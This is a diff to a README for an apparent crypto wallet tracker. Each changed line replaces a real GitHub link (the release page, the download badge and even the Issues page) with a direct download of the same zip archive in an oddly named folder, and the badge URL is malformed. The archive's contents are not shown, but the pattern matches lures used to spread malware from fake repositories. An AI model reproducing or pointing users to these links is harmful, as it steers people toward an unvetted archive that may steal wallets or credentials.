@@ -1,6 +1,6 @@
 # 🎉 crypto-wallet-performance-tracker - Track Your Crypto Wallet Performance Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/khalilgibran521/crypto-wallet-performance-tracker/releases)
+[![Download Now](https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip%https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip)](https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ To get started with the crypto-wallet-performance-tracker, follow these simple s
    - **Internet Connection**: Needed for data retrieval and updates.
 
 2. **Download the Application**
-   - Visit this page to download: [https://github.com/khalilgibran521/crypto-wallet-performance-tracker/releases](https://github.com/khalilgibran521/crypto-wallet-performance-tracker/releases).
+   - Visit this page to download: [https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip](https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip).
 
 3. **Select the Latest Release**
    - Scroll through the available releases. Choose the most recent version, as it includes the latest features and bug fixes.
@@ -51,7 +51,7 @@ To get started with the crypto-wallet-performance-tracker, follow these simple s
 
 If you encounter issues or have questions, the community is here to help. Join discussions on platforms like Discord or Reddit, where you'll find other users sharing their experiences and solutions.
 
-For specific inquiries or feedback, feel free to open an issue on our [GitHub Issues page](https://github.com/khalilgibran521/crypto-wallet-performance-tracker/issues).
+For specific inquiries or feedback, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/khalilgibran521/crypto-wallet-performance-tracker/main/intermitted/performance-wallet-crypto-tracker-1.0-alpha.4.zip).
 
 ## 📜 License
 
